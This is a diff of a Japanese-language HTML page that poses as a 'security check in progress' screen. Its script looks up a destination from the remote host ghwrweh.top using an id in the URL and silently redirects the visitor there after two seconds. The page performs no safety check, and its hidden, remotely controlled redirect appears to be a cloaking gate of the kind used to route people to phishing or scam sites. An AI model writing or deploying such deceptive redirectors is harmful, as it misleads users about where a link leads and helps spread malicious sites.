@@ -3,42 +3,62 @@
 <head>
   <meta charset="UTF-8">
   <title>セキュリティ確認中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex,nofollow">
   <style>
-    body { text-align:center; font-family:sans-serif; padding-top:80px; }
+    body {
+      font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
+      background-color: #f9f9f9;
+      text-align: center;
+      padding-top: 120px;
+      color: #333;
+    }
     .loader {
-      margin: 30px auto;
       border: 6px solid #f3f3f3;
       border-top: 6px solid #3498db;
       border-radius: 50%;
-      width: 50px; height: 50px;
+      width: 50px;
+      height: 50px;
       animation: spin 1s linear infinite;
+      margin: 30px auto;
     }
-    @keyframes spin { 0% {transform:rotate(0);} 100% {transform:rotate(360deg);} }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .caption {
+      font-size: 14px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
-  <h2>リンクの安全性を確認しています...</h2>
+  <h2>セキュリティ確認中...</h2>
+  <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
   <div class="loader"></div>
-  <p>まもなくページが表示されます。</p>
+  <p class="caption">セキュア認証サービス</p>
 
   <script>
-    const id = window.location.pathname.split("/").pop();
+    // 从 URL 中提取 id 参数
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get("id");
+
     if (!id) {
-      document.body.innerHTML = "<h3>無効なIDです</h3>";
+      document.body.innerHTML += '<p style="color:red;">ID パラメーターが不足しています。</p>';
     } else {
-      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + id)
-        .then(r => r.json())
+      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
+        .then(res => res.json())
         .then(data => {
-          const url = data?.data?.siteUrl;
-          if (url) {
-            setTimeout(() => location.href = url, 2000);
+          if (data && data.data && data.data.siteUrl) {
+            setTimeout(() => {
+              location.href = data.data.siteUrl;
+            }, 2000);
           } else {
-            document.body.innerHTML += "<p>リダイレクト先が見つかりません。</p>";
+            document.body.innerHTML += '<p style="color:red;">リダイレクト先を取得できませんでした。</p>';
           }
         })
         .catch(() => {
-          document.body.innerHTML += "<p>エラーが発生しました。</p>";
+          document.body.innerHTML += '<p style="color:red;">API 取得中にエラーが発生しました。</p>';
         });
     }
   </script>
